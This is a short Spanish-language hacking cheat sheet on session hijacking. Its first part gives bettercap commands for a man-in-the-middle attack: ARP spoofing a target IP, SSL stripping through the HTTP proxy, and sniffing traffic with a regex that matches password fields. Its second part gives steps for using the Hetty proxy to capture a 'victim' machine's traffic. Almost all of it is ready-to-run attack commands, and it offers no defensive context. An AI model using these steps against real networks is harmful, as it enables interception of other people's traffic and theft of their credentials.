# Secuestro de sesión 

Tags: #Hacking #SessionHijacking 

## Bettercap 

```bash 
# Kali Tool que sirve como Man-In-The-Middle
❯ bettercap -iface eth0                 # Seleccionar la interface a usar 

	❯ net.probe on                     # Enviar paquetes de prueba a las IPs de la red 
	❯ net.recon on                     # Reconocimiento de la red 
	❯ set http.proxy.sslstrip true     # Interceptación de tráfico HTTP
	❯ set arp.spoof.internal true 
	❯ set arp.spoof.targets IP_target 
	❯ http.proxy on 
	❯ arp.spoof on 
	❯ net.sniff on                     # Activar el sniffer 
	❯ set net.sniff.regexp '.password=.+'  
```

## Hetty 

```bash 
# Windows Tool 
❯ hetty.exe            # Ejecutar el programa 

Nota:
	1. Ingresar a la web para usar la interface gráfica 'http://localhost:8080/projects/'
	2. Colocar el nombre al projedto y crearlo 
	3. click en 'Proxy logs' para ver los logs y el tráfico capturado 
	4. Se habilita el proxy en la máquina víctima 
```
